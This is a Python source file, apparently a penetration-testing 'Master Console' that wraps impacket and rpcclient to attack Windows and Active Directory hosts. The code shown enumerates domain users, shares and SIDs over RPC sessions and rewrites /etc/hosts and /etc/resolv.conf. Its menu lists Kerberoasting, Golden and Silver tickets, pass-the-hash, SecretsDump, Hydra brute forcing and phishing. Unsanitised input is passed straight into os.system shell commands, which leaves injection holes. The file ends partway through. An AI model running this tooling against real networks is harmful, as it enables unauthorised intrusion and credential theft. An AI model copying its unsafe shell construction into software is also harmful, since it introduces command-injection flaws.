#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#      PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF REMOTE COMPUTER SYSTEMS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import time
import getopt
import os.path
import hashlib
import binascii
import datetime
import requests
import linecache

from termcolor import colored
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Conduct simple and routine tests on any user supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print("\n[*] Please run this python3 script as root...")
    exit(True)
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Create local user definable variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

colour1 = "yellow"
colour2 = "green"
colour3 = "white"
colour4 = "red"
colour5 = "blue"
colour6 = "magenta"
colour7 = "cyan"
colour8 = "white"
colour9 = "black"

network = "tun0"	# LOCAL NETWORK
workdir = "MASTER"	# WORKING DIRECTORY

splashs = 1		# SPLASH SCREEN ON/OFF
bughunt = 0		# BUG HUNT ON/OFF
maximum = 5000		# MAX USERS - NOTE NOT UNLIMITED

keypath = "python3 /usr/share/doc/python3-impacket/examples/"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Obtain the local system IP address.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("ip a s " + network + " | awk '/inet/ {print $2}' > localip.tmp")
localip = linecache.getline("localip.tmp",1)
localip = localip.rstrip("\n")
localip,null = localip.split("/")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Create functional calls from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def padding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dpadding(variable,value):
   test = variable
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      if test == "":
         variable += " "
      else:
         variable += "."
   return variable

def rpadding(variable,value):
   while len(variable) < value:
      temp = variable
      variable = "." + temp
   return variable

def gettime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = padding(variable, value)
   return variable

def command(command):
   if bughunt == 1:
      print(colored(command, colour3))
   os.system(command)
   return
 
def prompt():
   selection = input("\nPress ENTER to continue...")
   return   

def cleanusers():
   for x in range (0, maximum):
      USER[x] = " "*COL3
      PASS[x] = " "*COL4
   return
   
def cleanshares():
   for x in range(0, maximum):
      SHAR[x] = " "*COL2
   return

def display():
   print('\u2554' + ('\u2550')*57 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + (" ")*30 + colored("REMOTE SYSTEM",colour3) +  (" ")*14 + '\u2551' + (" ")*1 + colored("SHARENAME",colour3) + (" ")*7 + colored("TYPE",colour3) + (" ")*6 + colored("COMMENT",colour3) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour3) + (" ")*16 + colored("NTFS PASSWORD HASH",colour3) + (" ")*15 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')

# -------------------------------------------------------------------------------------
 
   print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
   if DNS[:5] == "EMPTY":
      print(colored(DNS[:COL1],colour1), end=' ')
   else:
      print(colored(DNS[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[0],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[0] == 1:
      print(colored(USER[0],colour5), end=' ')
      print(colored(PASS[0],colour5), end=' ')
   else:
      print(colored(USER[0],colour2), end=' ')
      print(colored(PASS[0],colour2), end=' ')   
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
   if TIP[:5] == "EMPTY":
      print(colored(TIP[:COL1],colour1), end=' ')
   else:
      print(colored(TIP[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[1],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[1] == 1:
      print(colored(USER[1],colour5), end=' ')
      print(colored(PASS[1],colour5), end=' ')
   else:
      print(colored(USER[1],colour2), end=' ')
      print(colored(PASS[1],colour2), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " LIVE PORTS   " + '\u2502', end=' ')
   if POR[:5] == "EMPTY":
      print(colored(POR[:COL1],colour1), end=' ')
   else:
      lastChar = POR[COL1-1]
      print(colored(POR[:COL1-1],colour2) + colored(lastChar,colour4), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[2],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[2] == 1:
      print(colored(USER[2],colour5), end=' ')
      print(colored(PASS[2],colour5), end=' ')
   else:
      print(colored(USER[2],colour2), end=' ')
      print(colored(PASS[2],colour2), end=' ')         
   print('\u2551') 
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " WEB ADDRESS  " + '\u2502', end=' ')
   if WEB[:5] == "EMPTY":
      print(colored(WEB[:COL1],colour1), end=' ')
   else:
      print(colored(WEB[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[3],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[3] == 1:
      print(colored(USER[3],colour5), end=' ')
      print(colored(PASS[3],colour5), end=' ')
   else:
      print(colored(USER[3],colour2), end=' ')
      print(colored(PASS[3],colour2), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " USER NAME    " + '\u2502', end=' ')
   if USR[:2] == "''":
      print(colored(USR[:COL1],colour1), end=' ')
   else:
      print(colored(USR[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[4],colour2), end=' ')
   print('\u2551', end=' ')
   if VALD[4] == 1:
      print(colored(USER[4],colour5), end=' ')
      print(colored(PASS[4],colour5), end=' ')
   else:
      print(colored(USER[4],colour2), end=' ')
      print(colored(PASS[4],colour2), end=' ')   
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " PASS WORD    " + '\u2502', end=' ')
   if PAS[:2] == "''":
      print(colored(PAS[:COL1],colour1), end=' ')
   else:
      print(colored(PAS[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[5],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[5] == 1:
      print(colored(USER[5],colour5), end=' ')
      print(colored(PASS[5],colour5), end=' ')
   else:
      print(colored(USER[5],colour2), end=' ')
      print(colored(PASS[5],colour2), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
   if NTM[:5] == "EMPTY":
      print(colored(NTM[:COL1],colour1), end=' ')
   else:
      print(colored(NTM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[6],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[6] == 1:
      print(colored(USER[6],colour5), end=' ')
      print(colored(PASS[6],colour5), end=' ')
   else:
      print(colored(USER[6],colour2), end=' ')
      print(colored(PASS[6],colour2), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
   if DOM[:5] == "EMPTY":
      print(colored(DOM[:COL1],colour1), end=' ')
   else:
      print(colored(DOM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[7],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[7] == 1:
      print(colored(USER[7],colour5), end=' ')
      print(colored(PASS[7],colour5), end=' ')
   else:
      print(colored(USER[7],colour2), end=' ')
      print(colored(PASS[7],colour2), end=' ')         
   print('\u2551')
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
   if SID[:5] == "EMPTY":
      print(colored(SID[:COL1],colour1), end=' ')
   else:
      print(colored(SID[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[8],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[8] == 1:
      print(colored(USER[8],colour5), end=' ')
      print(colored(PASS[8],colour5), end=' ')
   else:
      print(colored(USER[8],colour2), end=' ')
      print(colored(PASS[8],colour2), end=' ')         
   print('\u2551')     
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
   if TSH[:5] == "EMPTY":
      print(colored(TSH[:COL1],colour1), end=' ')
   else:
      print(colored(TSH[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[9],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[9] == 1:
      print(colored(USER[9],colour5), end=' ')
      print(colored(PASS[9],colour5), end=' ')
   else:
      print(colored(USER[9],colour2), end=' ')
      print(colored(PASS[9],colour2), end=' ')      
   print('\u2551')        
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " SERVER TIME  " + '\u2502', end=' ')
   if SKEW == 0:
      print(colored(LTM[:COL1],colour1), end=' ')
   else:
      print(colored(LTM[:COL1],colour2), end=' ')
   print('\u2551', end=' ')
   print(colored(SHAR[10],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[10] == 1:
      print(colored(USER[10],colour5), end=' ')
      print(colored(PASS[10],colour5), end=' ')
   else:
      print(colored(USER[10],colour2), end=' ')
      print(colored(PASS[10],colour2), end=' ')         
   print('\u2551')   
   
# -------------------------------------------------------------------------------------

   print('\u2551' + " WORK FOLDER  " + '\u2502', end=' ')
   if DIR[:6] == workdir:
      print(colored(DIR[:COL1],colour1), end=' ')
   else:
      print(colored(DIR[:COL2],colour2), end=' ')
   print('\u2551', end=' ')   
   if SHAR[12][:1] != " ":
      print(colored(SHAR[11],'red'), end=' ')
   else:
      print(colored(SHAR[11],colour2), end=' ')
   print('\u2551', end=' ')   
   if VALD[11] == 1:
      print(colored(USER[11],colour5), end=' ')
      print(colored(PASS[11],colour5), end=' ')
   else:
      if USER[12][:1] != " ":   
         print(colored(USER[11],colour4), end=' ')
         print(colored(PASS[11],colour4), end=' ')
      else:
         print(colored(USER[11],colour2), end=' ')
         print(colored(PASS[11],colour2), end=' ')   
   print('\u2551')     
   
# -------------------------------------------------------------------------------------

   print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')

def options():
   print('\u2551' + "(0) REMOTE IP Scanner  (10) Re/Set SHARE NAME  (20) GetArch (30) Enum4Linux     (40) Kerberos Info  (50) Golden PAC  (60) GenSSHKeyID (70) Hydra FTP  (80) FTP     " + '\u2551')
   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set SERVER TIME (21) NetView (31) WinDap Search  (41) KerbUserFilter (51) Domain Dump (61) GenListUSER (71) Hydra SSH  (81) SSH     " + '\u2551')
   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) Hydra SMB  (82) SSH ID  " + '\u2551')
   print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) BH ACLPwn   (63) Editor USER (73) Hydra POP3 (83) Telnet  " + '\u2551')
   print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) Hydra TOM  (84) NetCat  " + '\u2551')
   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HASH (75) MSF TOMCAT (85) SQSH    " + '\u2551')
   print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor HOST (76) RemoteSync (86) MSSQL   " + '\u2551')
   print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) GoPhishing  (77) RSyncDumpS (87) MySQL   " + '\u2551')
   print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) GoBuster    (78) RDeskTop   (88) WinRm   " + '\u2551')
   print('\u2551' + "(9) Re/Set DOMAIN SID  (19) NMAP SERVER TIME   (29) OpDump  (39) SmbMount SHARE (49) Golden Ticket  (59) NTDSDecrypt (69) Nikto Scan  (79) XDesktop   (89) Exit    " + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Display universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("clear")
command("xdotool key Alt+Shift+S; xdotool type 'MASTER CONSOLE'; xdotool key Return")

print(" __  __    _    ____ _____ _____ ____     ____ ___  _   _ ____   ___  _     _____ ")
print("|  \/  |  / \  / ___|_   _| ____|  _ \   / ___/ _ \| \ | / ___| / _ \| |   | ____|")
print("| |\/| | / _ \ \___ \ | | |  _| | |_) | | |  | | | |  \| \___ \| | | | |   |  _|  ")
print("| |  | |/ ___ \ ___) || | | |___|  _ <  | |__| |_| | |\  |___) | |_| | |___| |___ ")
print("|_|  |_/_/   \_\____/ |_| |_____|_| \_\  \____\___/|_| \_|____/ \___/|_____|_____|")
print("                                                                                  ")
print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)               ")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Boot the system and initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print("\n[*] Booting - Please wait...")
print("[+] Using localhost IP address " + localip + "...")

if not os.path.exists(workdir):
   os.mkdir(workdir)
   print("[+] Work directory created...")
else:
   print("[-] Work directory already exists...")		# DEFAULT WORK DIRECTORY

if not os.path.exists("usernames.txt"):			
   command("touch usernames.txt")
   print("[+] File usernames.txt created...")
else:
   print("[-] File usernames.txt already exists...")		# DEFUALT USERNAME LIST
   
if not os.path.exists("passwords.txt"):			
   command("touch passwords.txt")
   print("[+] File passwords.txt created...")
else:
   print("[-] File passwords.txt already exists...")		# DEFUALT PASSWORD LIST

if not os.path.exists("hashes.txt"):			
   command("touch hashes.txt")
   print("[+] File hashes.txt created...")
else:
   print("[-] File hashes.txt already exists...")		# DEFUALT HASHFILE LIST
   
if not os.path.exists("shares.txt"):
   command("touch shares.txt")
   print("[+] File shares.txt created...")
else:
   print("[-] File shares.txt already exists...")		# DEFUALT SHARES LIST
   
print("[+] Populating system variables...")

SKEW = 0         	# TIME SKEW
DOMC = 0		# DOMAIN COUNTER
DNSC = 0		# DNS COUNTER
COL1 = 40	 	# SESSIONS
COL2 = 44	 	# SHARE NAMES
COL3 = 23	 	# USER NAMES
COL4 = 32	 	# HASHED PASSWORDS
IP46 = "-4"		# IP TYPE

SHAR = [" "*COL2]*maximum	# SHARE NAMES
USER = [" "*COL3]*maximum	# USER NAMES
PASS = [" "*COL4]*maximum	# PASSWORDS
VALD = [0]*maximum		# USER TOKEN

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists('config.txt'):
   print("[+] Configuration file not found - using defualt values...")
   DNS = "EMPTY              " # DNS NAME
   TIP = "EMPTY              " # REMOTE IP
   POR = "EMPTY              " # LIVE PORTS
   WEB = "EMPTY              " # WEB ADDRESS
   USR = "''                 " # SESSION USERNAME
   PAS = "''                 " # SESSION PASSWORD       
   NTM = "EMPTY              " # NTLM HASH
   DOM = "EMPTY              " # DOMAIN NAME
   SID = "EMPTY              " # DOMAIN SID
   TSH = "EMPTY              " # SESSION SHARE
   LTM = "00:00              " # LOCAL TIME    
   DIR = workdir	       # DIRECTORY
else:
   print("[+] Configuration file found - restoring saved data....")
   DNS = linecache.getline('config.txt', 1).rstrip("\n")
   TIP = linecache.getline('config.txt', 2).rstrip("\n")
   POR = linecache.getline('config.txt', 3).rstrip("\n")
   WEB = linecache.getline('config.txt', 4).rstrip("\n")
   USR = linecache.getline('config.txt', 5).rstrip("\n")
   PAS = linecache.getline('config.txt', 6).rstrip("\n")
   NTM = linecache.getline('config.txt', 7).rstrip("\n")
   DOM = linecache.getline('config.txt', 8).rstrip("\n")	
   SID = linecache.getline('config.txt', 9).rstrip("\n")
   TSH = linecache.getline('config.txt', 10).rstrip("\n")
   LTM = linecache.getline('config.txt', 11).rstrip("\n")
   DIR = linecache.getline('config.txt', 12).rstrip("\n")   
   
   for x in range (0, maximum):
      USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
      USER[x] = padding(USER[x], COL3)
      
   for x in range (0, maximum):
      PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
      PASS[x] = padding(PASS[x], COL4)

   for x in range(0, maximum):
      SHAR[x] = linecache.getline("shares.txt",x + 1).rstrip(" ")
      SHAR[x] = SHAR[x].lstrip()
      SHAR[x] = padding(SHAR[x], COL2)

if len(DNS) < COL1: DNS = padding(DNS, COL1)
if len(TIP) < COL1: TIP = padding(TIP, COL1)
if len(POR) < COL1: POR = padding(POR, COL1)
if len(WEB) < COL1: WEB = padding(WEB, COL1)
if len(USR) < COL1: USR = padding(USR, COL1)
if len(PAS) < COL1: PAS = padding(PAS, COL1)
if len(NTM) < COL1: NTM = padding(NTM, COL1)
if len(DOM) < COL1: DOM = padding(DOM, COL1)
if len(SID) < COL1: SID = padding(SID, COL1)
if len(TSH) < COL1: TSH = padding(TSH, COL1)
if len(LTM) < COL1: LTM = padding(LTM, COL1)
if len(DIR) < COL1: DIR = padding(DIR, COL1)

if DOM[:5] != "EMPTY":
   command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
   DOMC = 1

if":" in TIP:
   IP46 = "-6"

if splashs == 1:
   time.sleep( 5 )

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   command("rm *.tmp")
   linecache.clearcache()
   linecache.checkcache(filename=None)
   command("clear")
   LTM = gettime(COL1)
   display()
   options()
   selection=input("[*] Please Select: ")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':   
      CheckParams = 0

      if (TIP[:5] == "EMPTY"):
         print("[-] Remote IP address not specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
         line1 = linecache.getline("lsaquery.tmp", 1)
         
         if (line1[:6] == "Cannot") or (line1[:1] == "") or "ACCESS_DENIED" in line1:
            print(colored("[!] WARNING!!! - Unable to connect to RPC data...",'red'))
            CheckParams = 1
         else:
            print("[*] Attempting to enumerate domain name...")
            
      if CheckParams != 1:
         DOM = " "*COL1					# WE HAVE CONNECTION SO
         SID = " "*COL1					# WIPE CLEAN CURRENT VALUES
         try:
            null,DOM = line1.split(":")
         except ValueError:
            DOM = "EMPTY"
            
      if CheckParams != 1:                  
         DOM = DOM.strip(" ")					# CLEAN UP DATA
         if len(DOM) < COL1: DOM = padding(DOM, COL1)
                  
         if DOM[:5] == "EMPTY":
           print("[-] Unable to enumerate domain name...")
         else:
            print("[+] Found domain...\n")
            print(colored(DOM,colour2))
            
            if DOMC == 1:
               print("\n[*] Resetting current domain association...")
               command("sed -i '$d' /etc/hosts")
               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            else:
               command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
               print("\n[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
               DOMC = 1
                     
# ------------------------------------------------------------------------------------- 

         print("[*] Attempting to enumerate domain SID...")
         line2 = linecache.getline("lsaquery.tmp", 2)
                     
         try:
            null,SID = line2.split(":")
         except ValueError:
            SID = "EMPTY"    
               
         SID = SID.strip(" ")				# CLEAN UP DATA
         SID = padding(SID, COL1)              
         
         if SID[:5] == "EMPTY":
            print("[-] Unable to enumerate domain SID...")
         else:
            print("[+] Found SID...\n")
            print(colored(SID,colour2) + "\n")
                 
# ------------------------------------------------------------------------------------- 
          
         print("[*] Attempting to enumerate shares...")
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares1.tmp")
  
         line3 = linecache.getline("shares1.tmp", 1)
         if (line3[:9] == "Could not") or (line3[:6] == "Cannot") or (line3[:1] == "") or "ACCESS_DENIED" in line3:
            print("[-] Unable to enumerate shares...")
         else:
            cleanshares()						# WIPE CURRENT SHARE VALUES

            command("sed -i -n '/netname: /p' shares1.tmp")		# TIDY UP FILE FOR READING
            command("sed -i '/^$/d' shares1.tmp")
            command("cat shares1.tmp | sort > shares2.tmp")
                        
            count = len(open('shares2.tmp').readlines())
            if count != 0:
               print("[+] Found shares...\n")
               for x in range(0, count):
                  SHAR[x] = linecache.getline("shares2.tmp", x + 1)
                  SHAR[x] = SHAR[x].replace(" ","")
                  try:
                     null, SHAR[x] = SHAR[x].split(":")
                  except ValueError:
                     SHAR[x] = "Error..."
                  print(colored(SHAR[x].rstrip("\n"),colour2))
                  if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)
               print("")
                  
# ------------------------------------------------------------------------------------- 
     
         print("[*] Attempting to enumerate domain users...")          
         command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers1.tmp")      

         line4 = linecache.getline("domusers1.tmp", 1)
         if (line4[:9] == "Could not") or (line4[:6] == "result") or (line4[:6] == "Cannot") or (line4[:1] == "") or "ACCESS_DENIED" in line4:
            print("[-] Unable to enumerate domain users...")
         else:
            cleanusers()							# WIPE CLEAN USERS AND PASSWORDS             
            os.remove("usernames.txt")						# PURGE CURRENT USERFILE LIST            
            command("touch usernames.txt")					# CREATE NEW USERFILE LIST   
                     
            command("cat domusers1.tmp | sort > domusers2.tmp")			# TIDY NEW USER FILE FOR READING
            command("sed -i '/^$/d' domusers2.tmp")
            
            count2 = len(open('domusers2.tmp').readlines()) 
            if count2 != 0:
               print ("[+] Found users...\n")
               for x in range(0, count2):
                  line5 = linecache.getline("domusers2.tmp", x + 1)
                  try:
                     null,USER[x],null2 = line5.split(":");
                  except ValueError:
                     USER[x] = "Error..."
                  USER[x] = USER[x].replace("[","")
                  USER[x] = USER[x].replace("]","")
                  USER[x] = USER[x].replace("rid","")
                  if USER[x][:5] != "Error":
                     print(colored(USER[x],colour2))
                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                  command("echo " + USER[x] + " >> usernames.txt")
      
      command("rm *.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNS
      DNS = input("[*] Please enter DNSERVER IP address: ")

      if DNS == "":
         DNS = BAK
      else:
         if len(DNS) < COL1:
            DNS = padding(DNS, COL1)
         if DNSC == 1:
            print("\n[+] Resetting current DNSERVER IP association...")
            command("sed -i '$d' /etc/resolv.conf")
            DNS = "EMPTY"
            DNS = padding(DOM, COL1)
            DNSC = 0
         if DNS[:5] != "EMPTY":
            command("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
            print("[+] DNSERVER IP " + DNS.rstrip(" ") + " has been added to /etc/resolv.conf...")
            DNSC = 1
         if":" in TIP:
            print("[*] Defaulting to IP 6...")
            IP46 = "-6"
         else:
            print("[*] Defualting to IP 4...")
            IP46 = "-4"            
      prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("[*] Please enter REMOTE IP address: ")

      if TIP == "":
         TIP = BAK
      else:
         if len(TIP) < COL1:
            TIP = padding(TIP, COL1)
         if DOMC == 1:
            print("[+] Resetting current domain association...")
            command("sed -i '$d' /etc/hosts")
            DOM = "EMPTY"
            DOM = padding(DOM, COL1)
            DOMC = 0

         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         
         if ":" in TIP:
            print("[*] Defaulting to IP 6...")
            IP46 = "-6"
         else:
            print("[*] Defualting to IP 4...")
            IP46 = "-4"
            
         authLevel = RPC_C_AUTHN_LEVEL_NONE
         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
         portmap = rpctransport.get_dce_rpc()
         portmap.set_auth_level(authLevel)
         portmap.connect()
         objExporter = IObjectExporter(portmap)
         bindings = objExporter.ServerAlive2()
         
         print("[*] Identifying network interfaces...\n")

         for binding in bindings:
             NetworkAddr = binding['aNetworkAddr']
             print(colored("Address: " + NetworkAddr, colour2))
         prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the remote port ranges.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      print("[+] Live ports: " + POR.rstrip(" "))
      BAK = POR
      POR = input("[*] Please enter PORT numbers: ")

      if POR != "":
         if len(POR) < COL1:
            POR = padding(POR, COL1)
         else:
            POR = POR.rstrip("\n")
      else:
         POR = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the web address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = WEB
      WEB = input("[*] Please enter the web address: ")

      if WEB != "":
         if len(WEB) < COL1:
            WEB = padding(WEB, COL1)
      else:
         WEB = BAK
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = USR
      USR = input("[*] Please enter USERNAME: ")

      if USR == "":
         USR = BAK
      else:
         if len(USR) < COL1: USR = padding(USR, COL1)
         for x in range(0, maximum):
            if USER[x].rstrip(" ") == USR.rstrip(" "):
               NTM = PASS[x] # UPDATE HASH VALUE TO MATCH USER.
               if NTM[:1] == "":
                  NTM = "''"
               NTM = padding(NTM, COL1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = PAS
      PAS = input("[*] Please enter PASSWORD: ")

      if PAS != "":
         if len(PAS) < COL1:
            PAS = padding(PAS, COL1)
      else:
         PAS = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
